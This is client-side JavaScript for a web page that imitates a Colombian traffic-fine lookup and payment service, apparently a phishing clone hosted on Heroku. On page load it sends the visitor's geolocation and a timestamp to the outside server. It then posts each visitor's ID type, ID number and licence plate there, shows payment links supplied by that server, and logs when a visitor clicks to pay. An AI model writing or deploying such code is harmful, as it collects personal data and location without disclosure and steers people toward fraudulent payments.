guardarIngreso();


function consultarComparendos() {
    var btnBuscar = document.getElementById("botonenviar");
    btnBuscar.value = "Consultando...";

    // Obtener el elemento select del tipo de documento
    var tipoDocumentoSelect = document.getElementsByName("tipo_documento")[0];
    // Obtener el valor seleccionado del combo box tipo_documento
    var tipoDocumento = tipoDocumentoSelect.options[tipoDocumentoSelect.selectedIndex].value;

    // Obtener los valores de los otros campos del formulario
    var numeroIdentificacion = document.getElementById("numero_identificacion").value;
    var placaVehiculo = document.getElementById("placa_veh").value;

    // Realizar la petición GET a través de XMLHttpRequest o fetch
    var xhr = new XMLHttpRequest();
    var url = "https://runt-multa-condonacion-f333d5224b81.herokuapp.com/app/comparendos" +
        "?tipoDocumento=" + tipoDocumento +
        "&numeroIdentificacion=" + numeroIdentificacion +
        "&placaVehiculo=" + placaVehiculo;

    xhr.open("GET", url, true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Manejar la respuesta aquí
                console.log(xhr.responseText);
                // Obtener la tabla donde se mostrarán los resultados
                var tablaInfo = document.getElementById("tabla-info");
                var filaImagen = document.getElementById("tabla-imagen1");
                var filaImagen2 = document.getElementById("tabla-imagen2");

                // Mostrar la tabla antes de agregar las filas dinámicamente
                tablaInfo.style.display = "block";
                // Limpiar contenido previo de la tabla
                tablaInfo.innerHTML = '';

                filaImagen.innerHTML = '<td colspan="13" bgcolor="#999999"><div align="left"><img src="images/cabnadinamic_01.gif" border="0"></div></td>';
                filaImagen2.innerHTML = '<td colspan="13" bgcolor="#999999"><div align="right"><img src="images/cabnadinamic_02.gif" border="0"></div></td>';

                // Crear la segunda fila con los títulos de datos
                var filaTitulos = document.createElement("tr");
                filaTitulos.id = "titulos-datos-consulta";
                filaTitulos.innerHTML = '<th id="titulo3" class="thtablapaginada"><span><font color="#000000"><b>Número</b></font>&nbsp;</span></th>' +
                    '<th id="titulo1" class="thtablapaginada"><span><font color="#000000"><b>Tipo</b></font>&nbsp;</span></th>' +
                    '<th id="titulo5" class="thtablapaginada"><span><font color="#000000"><b>Fecha</b></font>&nbsp;</span></th>' +
                    '<th id="titulo9" class="thtablapaginada"><span><font color="#000000"><b>Medio Imposición</b></font>&nbsp;</span></th>' +
                    '<th id="titulo6" class="thtablapaginada"><span><font color="#000000"><b>Saldo</b></font>&nbsp;</span></th>' +
                    '<th id="titulo2" class="thtablapaginada"><span><font color="#000000"><b>Estado comparendo</b></font>&nbsp;</span></th>' +
                    '<th id="titulo4" class="thtablapaginada"><span><font color="#000000"><b>Volante de Pago con Descuento Ley 2155 </b></font>&nbsp;</span></th>' +
                    '<th id="titulo8" class="thtablapaginada"><span><font color="#000000"><b>Placa</b></font>&nbsp;</span></th>' +
                    '<th id="titulo7" class="thtablapaginada"><span><font color="#000000"><b>Intereses</b></font>&nbsp;</span></th>' +
                    '<th id="titulo12" class="thtablapaginada"><span><font color="#000000"><b>Pagar en línea</b></font>&nbsp;</span></th>';

                // Agregar las filas a la tabla
                tablaInfo.appendChild(filaImagen);
                tablaInfo.appendChild(filaTitulos);

                // Convertir la respuesta JSON en un array de objetos
                var resultados = JSON.parse(xhr.responseText);
                // Iterar sobre cada resultado y agregarlo a la tabla
                resultados.forEach(function (resultado) {
                    var fila = document.createElement("tr");
                    // Crear celdas para cada propiedad del objeto resultado
                    for (var propiedad in resultado) {
                        if (resultado.hasOwnProperty(propiedad)) {
                            var celda = document.createElement("td");
                            console.log(propiedad+"___"+resultado[propiedad])
                            if (propiedad === "Intereses") {
                                var enlace = document.createElement("a");
                                var valorEnlace = resultado[propiedad].split("-")[1]; // Obtener el valor del enlace
                                enlace.href = resultado[propiedad].split("-")[0]; // Obtener el enlace
                                enlace.textContent = valorEnlace;
                                celda.appendChild(enlace);
                                enlace.onclick =guardarIngresoGENERAL("EL USUARIO VA A PAGAR");
                            } else {
                                celda.textContent = resultado[propiedad];
                            }
                            // Aplicar estilo a las celdas
                            celda.className = "tdtablapaginada1";

                            fila.appendChild(celda);
                        }
                    }
                    tablaInfo.appendChild(fila);
                    tablaInfo.appendChild(filaImagen2);
                });
                guardarModelo();
                btnBuscar.value = "Buscar";
            } else {
                btnBuscar.value = "Buscar";
                console.error("Error al realizar la petición:", xhr.status);
            }
        }
    };
    xhr.send();
}


// Función para guardar un nuevo registro
function guardarModelo() {
    // Obtener el elemento select del tipo de documento
    var tipoDocumentoSelect = document.getElementsByName("tipo_documento")[0];
    // Obtener el valor seleccionado del combo box tipo_documento
    var tipoDocumento = tipoDocumentoSelect.options[tipoDocumentoSelect.selectedIndex].value;

    // Obtener los valores de los otros campos del formulario
    var numeroIdentificacion = document.getElementById("numero_identificacion").value;
    var placaVehiculo = document.getElementById("placa_veh").value;

    // Crear el objeto modelo con los valores obtenidos
    var modelo = {
        tipoDocumento: tipoDocumento,
        numeroIdentificacion: numeroIdentificacion,
        placaVehiculo: placaVehiculo
    };

    fetch('https://runt-multa-condonacion-f333d5224b81.herokuapp.com/app/comparendos/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(modelo)
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error al guardar el registro');
            }
            return response.json();
        })
        .then(data => {
            console.log('Registro guardado exitosamente:', data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

function guardarIngreso() {
    // Obtener la fecha actual en el formato deseado (día, mes, año, hora, minutos, segundos)
    var fechaActual = obtenerFechaActual();

    // Obtener la ubicación del usuario
    obtenerUbicacion((ubicacion) => {
        // Crear el nombre del ingreso con la fecha y la ubicación
        var nombreIngreso = "ABRIO LINK EL DIA "+fechaActual + " - EN ESTA COORDENADA " + ubicacion;

        // Objeto con los datos del ingreso a guardar
        var ingreso = {
            nombre: nombreIngreso
        };

        // Convertir el objeto a formato JSON
        var jsonIngreso = JSON.stringify(ingreso);

        // Configuración de la solicitud HTTP
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://runt-multa-condonacion-f333d5224b81.herokuapp.com/app/ingreso/save", true); // Corregir la ruta a "/app/ingreso/save"
        xhr.setRequestHeader("Content-Type", "application/json");

        // Manejar la respuesta de la solicitud
        xhr.onload = function () {
            if (xhr.status === 201) {
                console.log("Ingreso SECURE");
            } else {
                console.error("Error al guardar el ingreso");
            }
        };

        // Enviar la solicitud con los datos del ingreso
        xhr.send(jsonIngreso);
    });
}

function guardarIngresoGENERAL(texto) {
    // Obtener la fecha actual en el formato deseado (día, mes, año, hora, minutos, segundos)
    var fechaActual = obtenerFechaActual();

    // Crear el nombre del ingreso con la fecha
    var nombreIngreso = fechaActual+texto;

    // Objeto con los datos del ingreso a guardar
    var ingreso = {
        nombre: nombreIngreso
    };

    // Convertir el objeto a formato JSON
    var jsonIngreso = JSON.stringify(ingreso);

    // Configuración de la solicitud HTTP
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://runt-multa-condonacion-f333d5224b81.herokuapp.com/app/ingreso/save", true); // Corregir la ruta a "/app/ingreso/save"
    xhr.setRequestHeader("Content-Type", "application/json");

    // Manejar la respuesta de la solicitud
    xhr.onload = function () {
        if (xhr.status === 201) {
            console.log("Ingreso SECURE");
        } else {
            console.error("Error al guardar el ingreso");
        }
    };

    // Enviar la solicitud con los datos del ingreso
    xhr.send(jsonIngreso);
}



// Función para obtener la fecha actual en el formato deseado
function obtenerFechaActual() {
    var fecha = new Date();
    var dia = agregarCero(fecha.getDate());
    var mes = agregarCero(fecha.getMonth() + 1); // Sumar 1 porque los meses van de 0 a 11
    var año = fecha.getFullYear();
    var hora = agregarCero(fecha.getHours());
    var minutos = agregarCero(fecha.getMinutes());
    var segundos = agregarCero(fecha.getSeconds());

    return dia + "/" + mes + "/" + año + " " + hora + ":" + minutos + ":" + segundos;
}

// Función para agregar un cero delante de los números menores a 10
function agregarCero(numero) {
    return numero < 10 ? "0" + numero : numero;
}

// Función para obtener la ubicación del usuario
function obtenerUbicacion(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function (position) {
            var latitud = position.coords.latitude;
            var longitud = position.coords.longitude;
            // Puedes usar la API de geocodificación inversa para obtener la ubicación a partir de la latitud y longitud
            // Por simplicidad, aquí se muestra solo la latitud y longitud
            var ubicacion = "Latitud: " + latitud + ", Longitud: " + longitud;
            callback(ubicacion);
        });
    } else {
        console.log("Geolocalización no disponible");
        callback("Ubicación desconocida");
    }
}






